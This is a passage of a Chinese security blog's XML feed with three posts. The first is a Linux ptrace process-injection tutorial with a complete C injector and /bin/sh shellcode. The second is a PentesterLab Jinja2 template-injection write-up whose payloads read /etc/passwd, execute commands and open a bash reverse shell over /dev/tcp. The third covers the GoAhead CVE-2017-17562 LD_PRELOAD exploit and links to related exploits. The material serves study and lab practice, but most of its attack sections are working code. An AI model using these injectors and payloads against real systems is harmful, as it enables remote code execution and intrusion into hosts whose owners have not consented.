-<li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li>
-<li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li>
-<li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li>
-<li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li>
-<li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li>
-<li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
-<li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;sys/reg.h&gt;</span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">main (int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  pid_t                   target;</span><br><span class="line">  struct user_regs_struct regs;</span><br><span class="line">  int                     syscall;</span><br><span class="line">  long                    dst;</span><br><span class="line"></span><br><span class="line">  if (argc != 2)</span><br><span class="line">    &#123;</span><br><span class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[1]);</span><br><span class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</span><br><span class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(ATTACH):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Waiting for process...\n&quot;);</span><br><span class="line">  wait (NULL);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
-<li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
-<li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li>
-<li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li>
-</ul>
-<ol>
-<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li>
-<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
-<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
-<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
-</ol>
-<ul>
-<li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
-<li><p>下面代码注入我们的“恶意代码”到目标进程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;+ Getting Registers\n&quot;);</span><br><span class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">  &#123;</span><br><span class="line">    perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">    exit (1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</span><br><span class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line">regs.rip += 2;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
-</li>
-<li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
-<li><p>让我们看看是怎么样的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</span><br><span class="line">&#123;</span><br><span class="line">  int      i;</span><br><span class="line">  uint32_t *s = (uint32_t *) src;</span><br><span class="line">  uint32_t *d = (uint32_t *) dst;</span><br><span class="line"></span><br><span class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</span><br><span class="line">	  return -1;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
-</li>
-</ul>
-<ol>
-<li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li>
-<li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li>
-</ol>
-<ul>
-<li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</span><br><span class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Run it!\n&quot;);</span><br><span class="line"> </span><br><span class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (&quot;ptrace(DETACH):&quot;);</span><br><span class="line">	  exit (1);</span><br><span class="line">	&#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
-</li>
-<li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li>
-<li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易，我来告诉大家。</li>
-<li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个可能的原因是目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
-<li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧; ）所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ Tracing process 15333</span><br><span class="line">+ Waiting for process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7ffe9a708728</span><br><span class="line">+ Setting instruction pointer to 0x7ffe9a708708</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./target core</span><br><span class="line">(... gdb start up messages removed ...)</span><br><span class="line">Reading symbols from ./target...(no debugging symbols found)...done.</span><br><span class="line">[New LWP 15333]</span><br><span class="line">Core was generated by `./target&apos;.</span><br><span class="line">Program terminated with signal SIGSEGV, Segmentation fault.</span><br><span class="line">#0  0x00007ffe9a708706 in ?? ()</span><br></pre></td></tr></table></figure>
-<ul>
-<li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
-<li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;   </span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</span><br><span class="line">    for(i = 0;i &lt; 10; ++i) &#123;</span><br><span class="line"></span><br><span class="line">	write (1, &quot;Hello World\n&quot;, 12);</span><br><span class="line">        sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">        global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov rdx,rax             ; No Env</span><br><span class="line">        mov rsi,rax             ; No argv</span><br><span class="line">        lea rdi, [rel msg]</span><br><span class="line"></span><br><span class="line">        add al, 0x3b</span><br><span class="line"></span><br><span class="line">        syscall</span><br><span class="line">        msg db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>
-<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
-<li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
-<li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
-<li>1.修改注入代码到代码空隙</li>
-<li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
-<li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
-<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="noopener">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
-<li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li>
-<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="noopener">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
-<li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""><h4 id="20200102更新"><a href="#20200102更新" class="headerlink" title="20200102更新"></a>20200102更新</h4></li>
-<li><a href="inject a shared library (i.e. arbitrary code">https://github.com/DavidBuchanan314/dlinject</a> into a live linux process, without ptrace)</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>从一道pentesterlab的题目说起</title>
-    <link href="http://kevien.github.io/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
-    <id>http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/</id>
-    <published>2018-01-16T14:04:50.000Z</published>
-    <updated>2018-11-19T16:06:28.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
-<li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference中的链接。<br>这个题目和Reference文章基本是一样的。</li>
-<li><p>读文件就不解释了 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p>
-</li>
-<li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li>
-<li><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""></li>
-<li>索引233，后面就可以执行命令了，但是不能回显，这个时候可以把我们的命令执行后结果写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecommand.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">(&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>那能不能拿到shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
-<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
-<li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li>
-<li><p>一步一步找到os.system的索引为138</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</span><br><span class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138]</span><br><span class="line">(&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul>
-<li>本来想写个长文介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好 ;)<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="noopener">Exploring SSTI in Flask/Jinja2</a></li>
-<li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="noopener">Exploring SSTI in Flask/Jinja2 - Part 2</a></li>
-<li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="noopener">CSAW-CTF Python sandbox write-up</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template In
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>有关CVE-2017-17562的一些零碎点</title>
-    <link href="http://kevien.github.io/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
-    <id>http://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/</id>
-    <published>2017-12-24T08:10:00.000Z</published>
-    <updated>2018-11-19T16:08:44.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li>
-<li>goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里<a href="https://embedthis.com/goahead/" target="_blank" rel="noopener">https://embedthis.com/goahead/</a><h4 id="CVE-2016-1247简单介绍"><a href="#CVE-2016-1247简单介绍" class="headerlink" title="CVE-2016-1247简单介绍"></a>CVE-2016-1247简单介绍</h4></li>
-<li>这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。<br></li>
-<li>具体需要的条件主要有如下：<br><br>1.GoAhead开启CGI功能，即有cgi的处理页面(关于GoAhead cgi的使用可以看向这里<a href="https://embedthis.com/goahead/doc/users/cgi.html" target="_blank" rel="noopener">https://embedthis.com/goahead/doc/users/cgi.html</a>)<br>2.需要GoAhead版本低于3.6.5<br>3.需要动态链接glibc库(默认是动态链接的)<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4></li>
-<li>在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、GoAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/origin.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/poc.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/afterpoc.png" alt=""><br>(a.html extract from wireshark)<br>可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/proc.png" alt=""><br>可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
-<li>这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件</li>
-<li>就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。<h4 id="漏洞引申1-有关nginx提权"><a href="#漏洞引申1-有关nginx提权" class="headerlink" title="漏洞引申1-有关nginx提权"></a>漏洞引申1-有关nginx提权</h4></li>
-<li>漏洞分析文章见这里<br><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">作者的poc shell脚本写的不错</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="noopener">Nginx权限提升漏洞(CVE-2016-1247) 分析</a></p>
-<ul>
-<li>之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。<h4 id="漏洞引申2-有关shellshock"><a href="#漏洞引申2-有关shellshock" class="headerlink" title="漏洞引申2-有关shellshock"></a>漏洞引申2-有关shellshock</h4></li>
-<li>对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。<br><a href="http://www.vuln.cn/6476" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试 - Debug_Orz</a><h4 id="漏洞引申3-其它"><a href="#漏洞引申3-其它" class="headerlink" title="漏洞引申3-其它"></a>漏洞引申3-其它</h4></li>
-<li>在github上看这个项目的一些cve issue <br><br><a href="https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed" target="_blank" rel="noopener">https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed</a><br><br>还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）<br><br>比如这个issue <a href="https://github.com/embedthis/goahead/issues/241" target="_blank" rel="noopener">https://github.com/embedthis/goahead/issues/241</a>中，某位安全研究员提的报告<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="noopener">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li>
-<li>As I’m a fan of looking at the source    –author <br><br>向作者学习，安全研究有个好处就是我们可以透过现象看本质，研究原理很有意思。</li>
-<li>有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待大牛们绕过的思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="noopener">REMOTE LD_PRELOAD EXPLOITATION</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1
     
     </summary>
     
